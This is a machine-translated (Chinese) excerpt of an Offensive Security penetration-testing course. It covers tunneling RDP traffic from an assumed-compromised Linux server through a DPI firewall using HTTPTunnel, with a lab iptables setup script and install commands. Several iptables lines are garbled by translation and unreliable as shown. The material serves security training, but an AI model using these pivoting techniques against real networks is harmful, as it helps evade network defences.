<div style="position:absolute;top:206887;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="175"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 175 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:206920;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:207997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:207997;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:207997;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">616</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:207016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.5 HTTPTunnel-ing 通过深度包检测</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们已经通过了基于端口过滤器和状态检查的防火墙。</font><font style="vertical-align: inherit;">然而，某些</font></font></nobr></div>
<div style="position:absolute;top:207077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">深度包内容检测设备可能只允许特定协议。</font><font style="vertical-align: inherit;">例如，如果 SSH</font></font></nobr></div>
<div style="position:absolute;top:207096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议不被允许，所有依赖该协议的隧道都将失败。</font></font></nobr></div>
<div style="position:absolute;top:207129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了证明这一点，我们将考虑一个新场景。</font><font style="vertical-align: inherit;">类似于我们的 *NIX 场景，让我们假设</font></font></nobr></div>
<div style="position:absolute;top:207148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们通过一个漏洞入侵了一台 Linux 服务器，将我们的权限提升为 root，并且</font></font></nobr></div>
<div style="position:absolute;top:207168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已经获得了对机器上 root 用户和学生用户密码的访问权限。</font></font></nobr></div>
<div style="position:absolute;top:207200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使我们受感染的 Linux 服务器实际上没有深度数据包检查</font></font></nobr></div>
<div style="position:absolute;top:207220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已实施，出于本节的目的，我们将假设深度数据包内容检查</font></font></nobr></div>
<div style="position:absolute;top:207239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已实现仅允许 HTTP 协议的功能。</font><font style="vertical-align: inherit;">与之前的场景不同，</font></font></nobr></div>
<div style="position:absolute;top:207258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 SSH 的隧道在这里不起作用。</font></font></nobr></div>
<div style="position:absolute;top:207291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另外，本场景的防火墙只允许80、443、1234端口进出。</font></font></nobr></div>
<div style="position:absolute;top:207311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80 和 443 端口是允许的，因为这台机器是一个 web 服务器，但 1234 显然是一个</font></font></nobr></div>
<div style="position:absolute;top:207330;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监督，因为它当前没有映射到内部网络中的任何侦听端口。</font></font></nobr></div>
<div style="position:absolute;top:207363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了模拟这个场景，我们将在我们的专用 Linux 上运行 http_tunneling.sh 脚本</font></font></nobr></div>
<div style="position:absolute;top:207382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:207417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /root/port_forwarding_and_tunneling/http_tunneling.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:207434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:207468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 清除iptables规则</font></font></nobr></div>
<div style="position:absolute;top:207485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输入接受</font></font></nobr></div>
<div style="position:absolute;top:207502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 向前接受</font></font></nobr></div>
<div style="position:absolute;top:207519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输出接受</font></font></nobr></div>
<div style="position:absolute;top:207536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -F</font></font></nobr></div>
<div style="position:absolute;top:207553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -X</font></font></nobr></div>
<div style="position:absolute;top:207586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># SSH 场景</font></font></nobr></div>
<div style="position:absolute;top:207604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -F</font></font></nobr></div>
<div style="position:absolute;top:207621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P 输入删除</font></font></nobr></div>
<div style="position:absolute;top:207638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -P FORWARD DROP</font></font></nobr></div>
<div style="position:absolute;top:207655;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A 输入 -i lo -j 接受</font></font></nobr></div>
<div style="position:absolute;top:207671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:207688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:207705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:207723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A INPUT -p tcp --dport 1234 -m state --state NEW -j ACCEPT</font></font></nobr></div>
<div style="position:absolute;top:207739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iptables -A 输入 -i lo -j 接受</font></font></nobr></div>
<div style="position:absolute;top:207773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">root@debian:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/root/port_forwarding_and_tunneling/http_tunneling.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:207792;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 656 - http_tunneling.sh 脚本的内容</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们的目标是从 Kali Linux 机器启动远程桌面连接到</font></font></nobr></div>
<div style="position:absolute;top:207842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Server 2016 通过仅使用 HTTP 协议的受感染 Linux 服务器。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:208075;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="176"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 176 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:208108;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:209185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:209185;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:209185;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">617</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将依靠</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTPTunnel </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">596</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将我们的流量封装在 HTTP 请求中，创建一个“HTTP</font></font></nobr></div>
<div style="position:absolute;top:208223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">隧道”。</font><font style="vertical-align: inherit;">HTTPTunnel 使用客户端/服务器模型，我们需要先安装该工具然后运行</font></font></nobr></div>
<div style="position:absolute;top:208242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">既是客户端又是服务器。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:208305;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stunnel </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">597</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具与 HTTPTunnel </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">598</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似</font><font style="vertical-align: inherit;">，可以以类似的方式使用。</font></font></i></nobr></div>
<div style="position:absolute;top:208324;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它是一个多平台 GNU/GPL 许可的代理，可以加密任意 TCP</font></font></i></nobr></div>
<div style="position:absolute;top:208343;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 SSL/TLS 的连接。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以从 Kali Linux 存储库安装 HTTPtunnel，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:208440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt-cache 搜索 httptunnel</font></font></font></b></nobr></div>
<div style="position:absolute;top:208457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">httptunnel - 在 HTTP 请求中传输数据流</font></font></nobr></div>
<div style="position:absolute;top:208491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install httptunnel</font></font></font></b></nobr></div>
<div style="position:absolute;top:208508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:208527;left:267"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 657 - 从 Kali Linux 存储库安装 HTTPTunnel</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:208557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在深入之前，我们将描述我们试图实现的交通流量。</font></font></nobr></div>
<div style="position:absolute;top:208590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，请记住我们在内部 Linux 服务器上有一个 shell。</font><font style="vertical-align: inherit;">这个 shell 是基于 HTTP 的（它</font></font></nobr></div>
<div style="position:absolute;top:208609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是唯一允许通过防火墙的协议），我们通过 TCP 端口 443（</font></font></nobr></div>
<div style="position:absolute;top:208628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易受攻击的服务端口）。</font></font></nobr></div>
<div style="position:absolute;top:208661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在这台机器上创建一个本地端口转发绑定到端口 8888，它将转发所有</font></font></nobr></div>
<div style="position:absolute;top:208680;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在端口 3389（远程桌面端口）上连接到 Windows Server。</font><font style="vertical-align: inherit;">注意这个端口</font></font></nobr></div>
<div style="position:absolute;top:208700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forward 不受 HTTP 协议限制的影响，因为两台机器都在同一台机器上</font></font></nobr></div>
<div style="position:absolute;top:208719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络，流量不经过深度包检测设备。</font><font style="vertical-align: inherit;">然而，协议</font></font></nobr></div>
<div style="position:absolute;top:208738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们尝试从 Linux 服务器连接隧道时，限制会给我们带来问题</font></font></nobr></div>
<div style="position:absolute;top:208758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到我们基于 Internet 的 Kali Linux 机器。</font><font style="vertical-align: inherit;">这是我们基于 SSH 的隧道将被阻止的地方</font></font></nobr></div>
<div style="position:absolute;top:208777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为不允许的协议。</font></font></nobr></div>
<div style="position:absolute;top:208810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了解决这个问题，我们将在机器之间创建一个基于 HTTP 的隧道（一种允许的协议）</font></font></nobr></div>
<div style="position:absolute;top:208829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 HTTP 隧道。</font><font style="vertical-align: inherit;">这个 HTTP 隧道的“输入”将在我们的 Kali Linux 机器上（本地主机端口</font></font></nobr></div>
<div style="position:absolute;top:208849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8080）并且隧道将“输出”到侦听端口 1234（跨</font></font></nobr></div>
<div style="position:absolute;top:208868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">防火墙）。</font><font style="vertical-align: inherit;">在这里，HTTP 请求将被解封装，并且流量将被移交给</font></font></nobr></div>
<div style="position:absolute;top:208887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听端口 8888（仍在受感染的 Linux 服务器上），这要归功于我们基于 SSH 的本地</font></font></nobr></div>
<div style="position:absolute;top:208907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forward，被重定向到我们的 Windows 目标的远程桌面端口。</font></font></nobr></div>
<div style="position:absolute;top:208939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置完成后，我们将启动到 Kali Linux 机器的本地主机的远程桌面会话</font></font></nobr></div>
<div style="position:absolute;top:208959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 8080。请求将被 HTTP 封装，作为 HTTP 流量通过 HTTPTunnel 发送到</font></font></nobr></div>
<div style="position:absolute;top:208978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 服务器上的 1234 端口，解封装，最后发送到我们 Windows 目标的远程</font></font></nobr></div>
<div style="position:absolute;top:208998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">桌面端口。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:209095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">596 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（塞巴斯蒂安·韦伯，2010 年），http://http-tunnel.sourceforge.net/</font></font></font></nobr></div>
<div style="position:absolute;top:209115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">597 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Stunnel，2019 年），https://www.stunnel.org/</font></font></font></nobr></div>
<div style="position:absolute;top:209135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">598 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（塞巴斯蒂安·韦伯，2010 年），http://http-tunnel.sourceforge.net/</font></font></font></nobr></div>
</span></font>


<script>_addload(function(){_setupIW('com');_csi('en','zh-CN','o3cp%5B442-617%5D.pdf');});</script>
            <script>
              function gtElInit() {
                var lib = new google.translate.TranslateService();
                lib.setCheckVisibility(false);
                lib.translatePage('en', 'zh-CN', function (progress, done, error) {
                  if (progress == 100 || done || error) {
                    document.getElementById("gt-dt-spinner").style.display = "none";
                  }
                });
              }
            </script>
            <script src="./o3cp[442-617]_files/f.txt">
            </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./o3cp[442-617]_files/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
          <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><span><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[442-617]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iws_w.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iws_e.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iws_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iws_nw" style="overflow: hidden;"></div><div class="SPRITE_iws_ne" style="overflow: hidden;"></div><div class="SPRITE_iws_sw" style="overflow: hidden;"></div><div class="SPRITE_iws_se" style="overflow: hidden;"></div><div class="SPRITE_iws_tap" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_l" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_u" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ul" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_rd" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ld" style="overflow: hidden;"></div><div class="SPRITE_iws_tab_dl" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_dr" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_l" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_r" style="overflow: hidden; display: none;"></div></div></span><div id="google-infowindow" class="notranslate"><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[442-617]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iw_w.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iw_e.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[442-617]_files/iw_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iw_nw" style="overflow: hidden;"></div><div class="SPRITE_iw_ne" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_l" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_u" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ul" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_rd" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ld" style="overflow: hidden;"></div><div class="SPRITE_iw_sw0" style="overflow: hidden;"></div><div class="SPRITE_iw_se0" style="overflow: hidden;"></div><div class="SPRITE_close" style="overflow: hidden; z-index: 10000; cursor: pointer; visibility: visible;"></div><div class="SPRITE_maximize" style="overflow: hidden; z-index: 10000; visibility: hidden; cursor: pointer; display: none;"></div><div class="SPRITE_restore" style="overflow: hidden; z-index: 10001; visibility: hidden; cursor: pointer; display: none;"></div></div></div><div style="display: none;"><iframe sandbox="" id="google-feedback-frame" name="FEEDBACK_TARGET_IFRAME_NAME" src="./o3cp[442-617]_files/saved_resource.html"></iframe></div></body></html>